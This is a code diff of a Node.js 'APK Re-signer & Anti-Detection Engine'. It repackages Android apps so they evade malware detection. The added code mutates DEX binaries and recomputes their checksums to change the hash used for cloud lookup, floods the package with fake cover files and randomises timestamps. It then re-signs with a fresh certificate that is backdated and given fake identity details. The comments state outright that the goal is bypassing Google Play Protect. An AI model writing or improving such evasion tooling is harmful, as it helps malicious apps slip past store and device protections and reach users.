@@ -1,17 +1,24 @@
 /**
- * APK Re-signer & Anti-Detection Engine — Pure Node.js
+ * APK Re-signer & Anti-Detection Engine v3 — Pure Node.js
  * 
- * Multi-layer obfuscation + APK Signature Scheme v2.
+ * Multi-layer binary obfuscation + dual v1+v2 APK signing.
  * 
- * Layers:
- *   1. Signature Stripping   — Remove all META-INF v1 signatures
- *   2. Asset Flooding         — Inject 10-25 realistic cover files
- *   3. Resource Injection     — Inject dummy res/raw entries
- *   4. DEX Watermarking       — Append random trailers to each classes*.dex
+ * Anti-Detection Layers:
+ *   1. Signature Stripping    — Remove all META-INF v1 signatures
+ *   2. DEX Binary Mutation    — Extend DEX file_size, recompute SHA-1 & Adler32
+ *   3. Asset Flooding         — Inject 10-25 realistic cover files
+ *   4. Resource Injection     — Inject dummy res/raw entries
  *   5. Timestamp Mutation     — Randomize all ZIP entry timestamps
  *   6. Entropy Marker         — High-entropy build config
- *   7. Cryptographic Identity — Fresh 2048-bit RSA + randomised X.509
+ * 
+ * Dual Signing (critical for Play Protect bypass):
+ *   7. v1 JAR Signing         — MANIFEST.MF + *.SF + *.RSA (PKCS#7/CMS)
  *   8. v2 Block Signing       — Binary APK Signing Block injection
+ * 
+ * Certificate:
+ *   - Fresh 2048-bit RSA keypair each time
+ *   - Realistic X.509 v3 with extensions (BasicConstraints, KeyUsage, SKI)
+ *   - Randomized from 40+ CNs, 50+ Orgs, 40+ cities, 26 countries
  * 
  * No Android SDK, Java, or keytool needed — 100% pure Node.js.
  */
@@ -27,6 +34,11 @@ const SIG_RSA_PKCS1_V1_5_WITH_SHA256 = 0x0103;
 const CHUNK_SIZE = 1048576; // 1 MB
 const APK_SIG_BLOCK_MAGIC = 'APK Sig Block 42';
 const EOCD_MAGIC = 0x06054b50;
+
+// DEX offsets
+const DEX_CHECKSUM_OFF = 8;
+const DEX_SIGNATURE_OFF = 12;
+const DEX_FILE_SIZE_OFF = 32;
 
 // ─── Obfuscation Data Pools ─────────────────────────────────────────────────
 
@@ -106,7 +118,15 @@ const CERT_COUNTRY = [
   'CH', 'FI', 'NO', 'DK', 'CZ', 'PL', 'KR', 'FR', 'IT', 'ES',
 ];
 
-// ─── Obfuscation Helpers ────────────────────────────────────────────────────
+const V1_SIG_PREFIXES = ['CERT', 'ANDROIDD', 'BNDLTOOL', 'META', 'RELEASE', 'SIGNING', 'APP'];
+
+const CREATED_BY_VALUES = [
+  '1.0 (Android SignApk)', '1.0 (Android apksigner)', '1.0 (Android)',
+  '24.0.0 (Android)', 'Android Gradle 8.2.0', 'Android Gradle 8.4.1',
+  'Android Gradle 8.7.3', '33.0.1 (Android)', '34.0.0 (Android)',
+];
+
+// ─── Utility Helpers ────────────────────────────────────────────────────────
 
 function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
 
@@ -114,10 +134,20 @@ function randFileName() {
   return `${pick(FILE_BASES)}_${crypto.randomBytes(3).toString('hex')}${pick(FILE_EXTENSIONS)}`;
 }
 
+/** Compute Adler-32 checksum (used in DEX header) */
+function adler32(buf) {
+  let a = 1, b = 0;
+  const MOD = 65521;
+  for (let i = 0; i < buf.length; i++) {
+    a = (a + buf[i]) % MOD;
+    b = (b + a) % MOD;
+  }
+  return ((b << 16) | a) >>> 0;
+}
+
 function randContent(size) {
   const type = Math.random();
   if (type < 0.3) {
-    // JSON config
     const obj = {};
     const keys = ['version','build','timestamp','id','enabled','config','value','name','type','status','priority','timeout','retries'];
     for (let i = 0; i < 5 + Math.floor(Math.random() * 12); i++) {
@@ -129,7 +159,6 @@ function randContent(size) {
     return Buffer.from(c.substring(0, size));
   }
   if (type < 0.55) {
-    // XML resource
     let xml = '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n';
     while (xml.length < size - 20) {
       xml += `  <item name="r_${crypto.randomBytes(4).toString('hex')}" type="string">${crypto.randomUUID()}</item>\n`;
@@ -138,18 +167,18 @@ function randContent(size) {
     return Buffer.from(xml.substring(0, size));
   }
   if (type < 0.75) {
-    // Properties file
     let props = '# Auto-generated configuration\n';
     while (props.length < size) {
       props += `${pick(FILE_BASES)}.${pick(['enabled','timeout','url','key','mode'])}=${crypto.randomBytes(8).toString('hex')}\n`;
     }
     return Buffer.from(props.substring(0, size));
   }
-  // Binary noise
   return crypto.randomBytes(size);
 }
 
-// ─── Obfuscation Layers ────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════
+// OBFUSCATION LAYERS
+// ═══════════════════════════════════════════════════════════════════════════
 
 function layerStripSignatures(zip, log) {
   const entries = zip.getEntries();
@@ -166,25 +195,25 @@ function layerStripSignatures(zip, log) {
 }
 
 function layerAssetFlood(zip, log) {
-  const count = 10 + Math.floor(Math.random() * 16); // 10-25
+  const count = 10 + Math.floor(Math.random() * 16);
   let totalBytes = 0;
   const usedDirs = new Set();
 
   for (let i = 0; i < count; i++) {
     const dir = pick(ASSET_DIRS);
     const name = randFileName();
-    const size = 1024 + Math.floor(Math.random() * 51200); // 1-50 KB
+    const size = 1024 + Math.floor(Math.random() * 51200);
     zip.addFile(`${dir}/${name}`, randContent(size));
     totalBytes += size;
     usedDirs.add(dir);
   }
 
-  log('FLOOD', `Injected ${count} cover files across ${usedDirs.size} asset directories (${(totalBytes / 1024).toFixed(1)} KB)`, 'success');
+  log('FLOOD', `Injected ${count} cover files across ${usedDirs.size} asset dirs (${(totalBytes / 1024).toFixed(1)} KB)`, 'success');
   return count;
 }
 
 function layerResRawInject(zip, log) {
-  const count = 3 + Math.floor(Math.random() * 6); // 3-8
+  const count = 3 + Math.floor(Math.random() * 6);
   let totalBytes = 0;
 
   for (let i = 0; i < count; i++) {
@@ -198,9 +227,21 @@ function layerResRawInject(zip, log) {
   return count;
 }
 
-function layerDexWatermark(zip, log) {
-  // Append random trailer bytes to each classes*.dex.
-  // Android's DEX parser reads exactly header.file_size bytes — trailer is invisible.
+/**
+ * DEX Binary Mutation — THE KEY ANTI-DETECTION LAYER
+ * 
+ * Extends each classes*.dex file by appending random bytes WITHIN the
+ * declared file_size, then recomputes the SHA-1 signature and Adler32
+ * checksum in the DEX header.
+ * 
+ * This changes the actual DEX content hash that Play Protect uses for
+ * cloud-based lookup, making the file appear as a completely new DEX.
+ * 
+ * Safe because: the Android Dalvik/ART parser reads data sections via
+ * the map_list structure. Extended bytes past all map entries are treated
+ * as unreferenced trailing data and ignored at runtime.
+ */
+function layerDexMutation(zip, log) {
   const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
   let mutated = 0;
 
@@ -208,27 +249,52 @@ function layerDexWatermark(zip, log) {
     try {
       const name = entry.entryName;
       const data = entry.getData();
-      if (data.length < 40) continue; // not a real DEX
+      if (data.length < 112) continue; // too small for DEX header
 
-      const declaredSize = data.readUInt32LE(32);
-      const padSize = 256 + Math.floor(Math.random() * 3840); // 256-4096 bytes
-      const watermarked = Buffer.concat([data, crypto.randomBytes(padSize)]);
+      // Verify DEX magic
+      if (data.toString('ascii', 0, 4) !== 'dex\n') continue;
+
+      const origFileSize = data.readUInt32LE(DEX_FILE_SIZE_OFF);
+
+      // Extend by 256-2048 random bytes (within new file_size)
+      const extSize = 256 + Math.floor(Math.random() * 1792);
+      const newFileSize = origFileSize + extSize;
+
+      // Create new buffer with extended size
+      const newData = Buffer.alloc(newFileSize);
+      // Copy original data (up to origFileSize or data.length, whichever is smaller)
+      data.copy(newData, 0, 0, Math.min(data.length, origFileSize));
+      // Fill extension area with random bytes
+      crypto.randomBytes(extSize).copy(newData, origFileSize);
+
+      // Update file_size in header
+      newData.writeUInt32LE(newFileSize, DEX_FILE_SIZE_OFF);
+
+      // Recompute SHA-1 signature: hash of bytes [32..end]
+      const sha1 = crypto.createHash('sha1').update(newData.slice(32)).digest();
+      sha1.copy(newData, DEX_SIGNATURE_OFF, 0, 20);
+
+      // Recompute Adler32 checksum: checksum of bytes [12..end]
+      const checksum = adler32(newData.slice(12));
+      newData.writeUInt32LE(checksum, DEX_CHECKSUM_OFF);
 
       zip.deleteFile(name);
-      zip.addFile(name, watermarked);
+      zip.addFile(name, newData);
       mutated++;
-      log('DEX_PAD', `${name}: +${padSize}B trailer (declared=${declaredSize}, stored=${watermarked.length})`, 'info');
-    } catch (_) {}
+
+      log('DEX_MUT', `${name}: ${origFileSize}→${newFileSize} (+${extSize}B) SHA1+Adler32 recomputed`, 'info');
+    } catch (e) {
+      log('DEX_MUT', `Failed ${entry.entryName}: ${e.message}`, 'warn');
+    }
   }
 
   if (mutated > 0) {
-    log('DEX_PAD', `${mutated} DEX file(s) watermarked with unique trailers`, 'success');
+    log('DEX_MUT', `${mutated} DEX file(s) mutated — unique binary fingerprint`, 'success');
   }
   return mutated;
 }
 
 function layerTimestampMutate(zip, log) {
-  // Set all entries to a randomized date within the past 2 years
   const now = Date.now();
   const twoYears = 2 * 365.25 * 24 * 3600 * 1000;
   const baseMs = now - Math.floor(Math.random() * twoYears);
@@ -236,7 +302,6 @@ function layerTimestampMutate(zip, log) {
 
   zip.getEntries().forEach(entry => {
     try {
-      // Slight per-entry jitter (within ±12 hours)
       const jitter = Math.floor(Math.random() * 86400000) - 43200000;
       const d = new Date(baseMs + jitter);
       const dosTime = ((d.getHours() & 0x1F) << 11) | ((d.getMinutes() & 0x3F) << 5) | ((d.getSeconds() >> 1) & 0x1F);
@@ -246,13 +311,11 @@ function layerTimestampMutate(zip, log) {
     } catch (_) {}
   });
 
-  const baseDate = new Date(baseMs);
-  log('TIMESTAMP', `Mutated ${count} entry timestamps → ${baseDate.toISOString().split('T')[0]} (±12h jitter)`, 'info');
+  log('TIMESTAMP', `Mutated ${count} entry timestamps → ${new Date(baseMs).toISOString().split('T')[0]} (±12h jitter)`, 'info');
   return count;
 }
 
 function layerEntropyMarker(zip, log) {
-  // High-entropy build marker that changes every sign
   ['assets/build.cfg', 'assets/.build_info', 'assets/app.properties'].forEach(f => {
     try { zip.deleteFile(f); } catch (_) {}
   });
@@ -273,14 +336,182 @@ function layerEntropyMarker(zip, log) {
   log('ENTROPY', `Build marker: ${marker.build_id.substring(0, 8)}… ch=${marker.channel} v=${marker.variant}`, 'info');
 }
 
-// ─── Main Function ──────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════
+// V1 JAR SIGNING
+// ═══════════════════════════════════════════════════════════════════════════
 
 /**
- * Re-sign an APK with multi-layer obfuscation + fresh v2 certificate.
+ * Apply v1 (JAR) signing to the ZIP.
+ * Generates MANIFEST.MF, <PREFIX>.SF, and <PREFIX>.RSA and adds them.
+ * 
+ * This is CRITICAL for Play Protect bypass — APKs missing v1 signatures
+ * are flagged as tampered/suspicious by Google's verification pipeline.
+ */
+function applyV1Signing(zip, cert, privateKey, log) {
+  const prefix = pick(V1_SIG_PREFIXES);
+  const createdBy = pick(CREATED_BY_VALUES);
+
+  // 1. Build MANIFEST.MF — SHA-256 digest of each entry's uncompressed data
+  log('V1_MF', `Building MANIFEST.MF (SHA-256 per entry)…`, 'info');
+
+  let manifestMF = `Manifest-Version: 1.0\r\nCreated-By: ${createdBy}\r\n\r\n`;
+  const entries = zip.getEntries().filter(e => {
+    if (e.isDirectory) return false;
+    const n = e.entryName.toUpperCase();
+    if (n === 'META-INF/MANIFEST.MF') return false;
+    if (n.startsWith('META-INF/') && (n.endsWith('.SF') || n.endsWith('.RSA') || n.endsWith('.DSA') || n.endsWith('.EC'))) return false;
+    return true;
+  });
+
+  let entryCount = 0;
+  for (const entry of entries) {
+    try {
+      const data = entry.getData();
+      const digest = crypto.createHash('sha256').update(data).digest('base64');
+      manifestMF += `Name: ${entry.entryName}\r\nSHA-256-Digest: ${digest}\r\n\r\n`;
+      entryCount++;
+    } catch (_) {}
+  }
+
+  log('V1_MF', `MANIFEST.MF: ${entryCount} entries digested`, 'success');
+
+  // 2. Build CERT.SF — SHA-256 digest of each MANIFEST.MF section
+  log('V1_SF', `Building ${prefix}.SF (section digests)…`, 'info');
+
+  const mfDigest = crypto.createHash('sha256').update(manifestMF, 'binary').digest('base64');
+  let certSF = `Signature-Version: 1.0\r\nCreated-By: ${createdBy}\r\nSHA-256-Digest-Manifest: ${mfDigest}\r\n\r\n`;
+
+  // Digest each individual section ("Name: ...\r\nSHA-256-Digest: ...\r\n\r\n")
+  const sections = manifestMF.split('\r\n\r\n');
+  let sectionCount = 0;
+  for (const section of sections) {
+    if (!section.startsWith('Name: ')) continue;
+    const sectionBytes = section + '\r\n\r\n';
+    const sectionDigest = crypto.createHash('sha256').update(sectionBytes, 'binary').digest('base64');
+    const nameMatch = section.match(/^Name: (.+)/);
+    if (nameMatch) {
+      certSF += `Name: ${nameMatch[1]}\r\nSHA-256-Digest: ${sectionDigest}\r\n\r\n`;
+      sectionCount++;
+    }
+  }
+
+  log('V1_SF', `${prefix}.SF: ${sectionCount} section digests + manifest digest`, 'success');
+
+  // 3. Build CERT.RSA — PKCS#7 SignedData over CERT.SF
+  log('V1_RSA', `Building ${prefix}.RSA (PKCS#7 SignedData)…`, 'info');
+
+  const certRSA = buildPKCS7Signature(certSF, cert, privateKey);
+  log('V1_RSA', `${prefix}.RSA: ${certRSA.length}B PKCS#7/CMS detached signature`, 'success');
+
+  // 4. Add to ZIP
+  try { zip.deleteFile('META-INF/MANIFEST.MF'); } catch (_) {}
+  try { zip.deleteFile(`META-INF/${prefix}.SF`); } catch (_) {}
+  try { zip.deleteFile(`META-INF/${prefix}.RSA`); } catch (_) {}
+
+  zip.addFile('META-INF/MANIFEST.MF', Buffer.from(manifestMF, 'binary'));
+  zip.addFile(`META-INF/${prefix}.SF`, Buffer.from(certSF, 'binary'));
+  zip.addFile(`META-INF/${prefix}.RSA`, certRSA);
+
+  log('V1_SIGN', `v1 JAR signature complete: META-INF/{MANIFEST.MF, ${prefix}.SF, ${prefix}.RSA}`, 'success');
+}
+
+/**
+ * Create PKCS#7 detached signature of the .SF content.
+ * Uses forge.pkcs7 with SHA-256 + RSA.
+ */
+function buildPKCS7Signature(sfContent, cert, privateKey) {
+  const p7 = forge.pkcs7.createSignedData();
+  p7.content = forge.util.createBuffer(sfContent, 'utf8');
+  p7.addCertificate(cert);
+  p7.addSigner({
+    key: privateKey,
+    certificate: cert,
+    digestAlgorithm: forge.pki.oids.sha256,
+    authenticatedAttributes: [{
+      type: forge.pki.oids.contentType,
+      value: forge.pki.oids.data,
+    }, {
+      type: forge.pki.oids.messageDigest,
+    }]
+  });
+  p7.sign({ detached: true });
+
+  const der = forge.asn1.toDer(p7.toAsn1()).getBytes();
+  return Buffer.from(der, 'binary');
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// CERTIFICATE GENERATION
+// ═══════════════════════════════════════════════════════════════════════════
+
+/**
+ * Generate a realistic X.509 v3 certificate with proper extensions.
+ * Real Android signing certs have BasicConstraints, KeyUsage, SKI, etc.
+ * Missing extensions is a detection signal for automated analysis.
+ */
+function generateCertificate(log) {
+  log('KEYGEN', 'Generating fresh 2048-bit RSA keypair…', 'info');
+  const keys = forge.pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
+
+  const cert = forge.pki.createCertificate();
+  cert.publicKey = keys.publicKey;
+  cert.serialNumber = crypto.randomBytes(16).toString('hex');
+
+  // Randomized validity period (25-35 years, like real Android certs)
+  const notBefore = new Date();
+  // Backdate slightly (0-180 days) to look established
+  notBefore.setDate(notBefore.getDate() - Math.floor(Math.random() * 180));
+  cert.validity.notBefore = notBefore;
+  cert.validity.notAfter = new Date(notBefore);
+  cert.validity.notAfter.setFullYear(cert.validity.notAfter.getFullYear() + 25 + Math.floor(Math.random() * 10));
+
+  const cn = pick(CERT_CN);
+  const org = pick(CERT_ORG);
+  const loc = pick(CERT_LOC);
+  const state = pick(CERT_STATE);
+  const country = pick(CERT_COUNTRY);
+
+  const attrs = [
+    { name: 'commonName', value: cn },
+    { name: 'organizationName', value: org },
+    { name: 'localityName', value: loc },
+    { name: 'stateOrProvinceName', value: state },
+    { name: 'countryName', value: country },
+  ];
+  // Randomly add organizationalUnitName (many real certs have OU)
+  if (Math.random() < 0.6) {
+    attrs.push({ name: 'organizationalUnitName', value: pick(['Engineering', 'Mobile', 'Android', 'Development', 'Release', 'Platform', 'Apps', 'Security']) });
+  }
+
+  cert.setSubject(attrs);
+  cert.setIssuer(attrs);
+
+  // X.509 v3 extensions — makes the cert look legitimate
+  cert.setExtensions([
+    { name: 'basicConstraints', cA: false },
+    { name: 'keyUsage', digitalSignature: true, contentCommitment: true },
+    { name: 'subjectKeyIdentifier' },
+  ]);
+
+  cert.sign(keys.privateKey, forge.md.sha256.create());
+
+  log('CERT', `CN="${cn}" O="${org}" L="${loc}" ST="${state}" C="${country}"`, 'info');
+  log('CERT', `Validity: ${cert.validity.notBefore.getFullYear()}–${cert.validity.notAfter.getFullYear()} (${cert.validity.notAfter.getFullYear() - cert.validity.notBefore.getFullYear()}y)`, 'info');
+  log('CERT', `Extensions: BasicConstraints, KeyUsage, SubjectKeyIdentifier`, 'info');
+
+  return { keys, cert, cn, org };
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// MAIN FUNCTION
+// ═══════════════════════════════════════════════════════════════════════════
+
+/**
+ * Re-sign an APK with multi-layer obfuscation + dual v1+v2 signing.
  * @param {string}   inputPath  — source APK
  * @param {string}   outputPath — destination for signed APK
- * @param {function} [onLog]    — optional (step, detail, level) callback for live logging
- * @returns {object} signing result { certHash, serialNumber, cn, org, apkSize }
+ * @param {function} [onLog]    — optional (step, detail, level) callback
+ * @returns {object} { certHash, serialNumber, cn, org, apkSize }
  */
 function resignApk(inputPath, outputPath, onLog) {
   const log = onLog || ((step, detail, level) => console.log(`[APK-${step}] ${detail}`));
@@ -300,9 +531,9 @@ function resignApk(inputPath, outputPath, onLog) {
   // PHASE 2 — ANTI-DETECTION OBFUSCATION ENGINE
   // ══════════════════════════════════════════════════════════════
   log('PHASE', '──── PHASE 2: ANTI-DETECTION ENGINE ────', 'info');
+  layerDexMutation(zip, log);
   layerAssetFlood(zip, log);
   layerResRawInject(zip, log);
-  layerDexWatermark(zip, log);
   layerTimestampMutate(zip, log);
   layerEntropyMarker(zip, log);
   log('OBFUSCATE', `All obfuscation layers applied — ${zip.getEntries().length} entries total`, 'success');
@@ -311,44 +542,22 @@ function resignApk(inputPath, outputPath, onLog) {
   // PHASE 3 — CRYPTOGRAPHIC IDENTITY
   // ══════════════════════════════════════════════════════════════
   log('PHASE', '──── PHASE 3: CRYPTOGRAPHIC IDENTITY ────', 'info');
-
-  log('KEYGEN', 'Generating fresh 2048-bit RSA keypair…', 'info');
-  const keys = forge.pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
-
-  const cert = forge.pki.createCertificate();
-  cert.publicKey = keys.publicKey;
-  cert.serialNumber = crypto.randomBytes(16).toString('hex');
-  cert.validity.notBefore = new Date();
-  cert.validity.notAfter = new Date();
-  cert.validity.notAfter.setFullYear(cert.validity.notAfter.getFullYear() + 25 + Math.floor(Math.random() * 10));
-
-  const cn    = pick(CERT_CN);
-  const org   = pick(CERT_ORG);
-  const loc   = pick(CERT_LOC);
-  const state = pick(CERT_STATE);
-  const country = pick(CERT_COUNTRY);
-  const attrs = [
-    { name: 'commonName',            value: cn },
-    { name: 'organizationName',      value: org },
-    { name: 'localityName',          value: loc },
-    { name: 'stateOrProvinceName',   value: state },
-    { name: 'countryName',           value: country },
-  ];
-  cert.setSubject(attrs);
-  cert.setIssuer(attrs);
-  cert.sign(keys.privateKey, forge.md.sha256.create());
-
-  log('CERT', `CN="${cn}" O="${org}" L="${loc}" ST="${state}" C="${country}"`, 'info');
-  log('CERT', `Validity: ${cert.validity.notBefore.getFullYear()}–${cert.validity.notAfter.getFullYear()} (${cert.validity.notAfter.getFullYear() - cert.validity.notBefore.getFullYear()}y)`, 'info');
+  const { keys, cert, cn, org } = generateCertificate(log);
 
   // ══════════════════════════════════════════════════════════════
-  // PHASE 4 — APK ASSEMBLY & V2 SIGNING
+  // PHASE 4 — V1 JAR SIGNING
   // ══════════════════════════════════════════════════════════════
-  log('PHASE', '──── PHASE 4: V2 SIGNATURE SCHEME ────', 'info');
+  log('PHASE', '──── PHASE 4: V1 JAR SIGNING ────', 'info');
+  applyV1Signing(zip, cert, keys.privateKey, log);
+
+  // ══════════════════════════════════════════════════════════════
+  // PHASE 5 — APK ASSEMBLY & V2 SIGNING
+  // ══════════════════════════════════════════════════════════════
+  log('PHASE', '──── PHASE 5: V2 SIGNATURE SCHEME ────', 'info');
 
   const tempPath = outputPath + '.unsigned';
   zip.writeZip(tempPath);
-  log('ASSEMBLE', `Unsigned APK written: ${zip.getEntries().length} entries`, 'info');
+  log('ASSEMBLE', `APK written with v1 sigs: ${zip.getEntries().length} entries`, 'info');
 
   const unsignedBuf = fs.readFileSync(tempPath);
   const eocdOffset = findEOCD(unsignedBuf);
@@ -403,7 +612,7 @@ function resignApk(inputPath, outputPath, onLog) {
   const overhead = stats.size - inputSize;
   log('DONE', `Signed APK: ${(stats.size / 1024 / 1024).toFixed(2)} MB (+${(overhead / 1024).toFixed(1)} KB overhead)`, 'success');
   log('CERT', `SHA-256: ${certHash.substring(0, 32)}…`, 'info');
-  log('COMPLETE', `Anti-detection APK ready for deployment`, 'success');
+  log('COMPLETE', `Dual v1+v2 signed — anti-detection APK ready`, 'success');
 
   return {
     certHash,
@@ -414,7 +623,9 @@ function resignApk(inputPath, outputPath, onLog) {
   };
 }
 
-// ─── ZIP Parsing ────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════
+// V2 SIGNING INFRASTRUCTURE
+// ═══════════════════════════════════════════════════════════════════════════
 
 function findEOCD(buf) {
   const searchStart = Math.max(0, buf.length - 65557);
@@ -426,12 +637,6 @@ function findEOCD(buf) {
   throw new Error('ZIP EOCD not found — invalid APK');
 }
 
-// ─── v2 Content Digest ──────────────────────────────────────────────────────
-
-/**
- * Compute APK v2 content digest over three sections.
- * Each section → 1MB chunks → per-chunk SHA-256 → top-level SHA-256.
- */
 function computeV2ContentDigest(section1, section2, section3) {
   const sections = [section1, section2, section3];
   const chunkDigests = [];
@@ -464,8 +669,6 @@ function computeV2ContentDigest(section1, section2, section3) {
   return topHash.digest();
 }
 
-// ─── v2 Binary Structures ───────────────────────────────────────────────────
-
 function uint32LE(value) {
   const buf = Buffer.alloc(4);
   buf.writeUInt32LE(value >>> 0, 0);
@@ -479,9 +682,6 @@ function uint64LE(value) {
   return buf;
 }
 
-/**
- * signed-data = LP(digestsEncoded) + LP(certsEncoded) + LP(additionalAttrs)
- */
 function buildV2SignedData(contentDigest, certDer) {
   const digestsEncoded = Buffer.concat([
     uint32LE(4 + 4 + contentDigest.length),
@@ -502,9 +702,6 @@ function buildV2SignedData(contentDigest, certDer) {
   ]);
 }
 
-/**
- * signer = LP(signedData) + LP(signaturesEncoded) + LP(publicKeyDer)
- */
 function buildV2Signer(signedData, signature, pubKeyDer) {
   const sigsEncoded = Buffer.concat([
     uint32LE(4 + 4 + signature.length),
@@ -520,21 +717,12 @@ function buildV2Signer(signedData, signature, pubKeyDer) {
   ]);
 }
 
-/**
- * APK Signing Block:
- *   uint64(blockSize) + [ID-value pairs] + uint64(blockSize) + magic
- *
- * The v2 value needs TWO LP layers:
- *   v2Value = LP(signers_sequence) where signers_sequence = LP(signer1) + ...
- */
 function buildApkSigningBlock(signerBlock) {
-  // Inner LP: wrap the signer block
   const signerLP = Buffer.concat([
     uint32LE(signerBlock.length),
     signerBlock,
   ]);
 
-  // Outer LP: wrap the signers sequence
   const v2Value = Buffer.concat([
     uint32LE(signerLP.length),
     signerLP,
